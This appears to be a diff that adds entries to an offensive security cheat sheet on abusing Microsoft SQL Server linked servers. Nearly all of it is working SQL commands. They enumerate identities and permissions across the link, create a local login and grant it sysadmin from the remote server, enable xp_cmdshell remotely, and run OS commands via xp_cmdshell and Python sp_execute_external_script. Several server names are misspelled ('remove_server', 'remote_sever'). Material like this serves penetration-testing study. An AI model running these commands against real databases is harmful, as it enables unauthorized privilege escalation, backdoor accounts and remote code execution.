@@ -175,6 +175,52 @@ EXEC ('EXEC sp_configure ''show advanced options'',1; RECONFIGURE; EXEC sp_confi
 EXEC ('EXEC xp_cmdshell ''whoami'';') AT [<remote_server>];
 ```
 
+See who we are on the linked DB:
 
+```bash
+EXEC ('select user_name();') AT [<remote_server>];
+```
 
+See what user the linked DB is on the local DB;
 
+```bash
+EXEC ('EXEC (''select suser_name();'') at [local_server]') at [remove_server];
+```
+
+View permission on linked DB:
+
+```bash
+EXECUTE ('SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''SERVER'');') at [remove_server]
+```
+
+View permission from linked DB to local DB:
+
+```bash
+EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [local_server]') at [remote_sever];
+```
+
+Create user on local DB from remove DB with admin permissions
+
+```bash
+EXECUTE('EXECUTE(''CREATE LOGIN <user> WITH PASSWORD = ''''<password>'''';'') AT [local_server]') AT [remove_server]
+
+EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<user>'''', ''''sysadmin'''''') AT [local_server]') AT [remove_server]
+```
+
+Enable xp_cmd shell from remote DB to local DB:
+
+```bash
+EXEC ('EXEC (''EXEC sp_configure ''''show advanced options'''',1; RECONFIGURE; EXEC sp_configure ''''xp_cmdshell'''',1; RECONFIGURE;'') AT [local_server];') AT [remove_server];
+```
+
+Execute commands from remote DB to local DB:
+
+```bash
+EXEC ('EXEC (''EXEC xp_cmdshell ''''whoami'''';'') AT [local_server];') AT [remove_server];
+```
+
+Using `sp_execute_external_script` to run commands as another user:
+
+```bash
+EXEC ('EXEC (''EXEC sp_execute_external_script @language = N''''Python'''', @script = N''''import os; os.system("whoami")'''';'') AT [local_server];') AT [remote_server];
+```
